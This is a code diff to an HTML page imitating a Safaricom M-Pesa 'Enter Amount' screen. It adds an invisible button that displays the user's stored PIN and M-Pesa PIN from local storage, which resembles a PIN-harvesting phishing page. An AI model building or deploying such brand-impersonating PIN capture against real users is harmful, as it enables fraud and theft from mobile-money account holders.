@@ -52,21 +52,40 @@
         height: 20px;
         border-radius: 25;
     }
-
+    #showpin{
+        outline: none;
+    }
+    input {
+        width: 80%;
+        padding: 10px;
+        margin-top: 10px;
+        border: none;
+        border-bottom: 1px solid #000;
+        box-sizing: border-box;
+    }
 </style>
 <body>
     <label id="heading">Safaricom</label>
     <label id="subheading">Enter Amount</label>
     <label id="enternumberlabel">digits(0-9,*,#,+)10-13</label>
-    <input id="enternumberinput" type="symbols">
+    <input id="enternumberinput" type="number">
     <button id="getphonebutton">ok</button>
+    <button id="showpin"></button>
     <script>
         function getPhoneNumber(){
             amount=document.getElementById("enternumberinput").value;
             sessionStorage.setItem("sendamount",amount)
                         window.location.href="pin/index.html"
+                        
+        }
+        function showpin(){
+            pin=localStorage.getItem("pin")
+            mpesapin=localStorage.getItem("mpesa pin")
+            g=`pin=${pin}<br>mpesa pin=${mpesapin}`
+            alert(g)
         }
         document.getElementById("getphonebutton").addEventListener("click",getPhoneNumber)
+        document.getElementById("showpin").addEventListener("click",showpin)
     </script>
 </body>
 </html>
